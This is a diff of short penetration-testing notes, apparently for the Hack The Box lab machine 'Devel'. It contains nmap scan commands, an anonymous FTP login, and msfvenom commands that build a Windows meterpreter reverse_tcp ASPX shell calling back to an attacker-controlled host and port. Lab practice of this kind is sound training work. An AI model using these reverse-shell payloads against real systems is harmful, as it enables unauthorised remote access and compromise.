@@ -1,9 +1,16 @@
 #nmap --script=http-methods.nse --script-args http-methods.retest=1 10.10.10.5
 #nmap -sC -sV -oA devel-10.10.10.5 10.10.10.5
-#ftp 10.10.10.5
 
 
 [MSFVENOM]
 
 #msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=10.10.14.8 LPORT=445
+#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f aspx -o devel-upload-shell.aspx
+#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f aspx >devel-upload-shell.aspx
+
+$ftp 10.10.10.5 - User: Anonymous, Passwd: 
+
+
+
+SOURCE
 http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
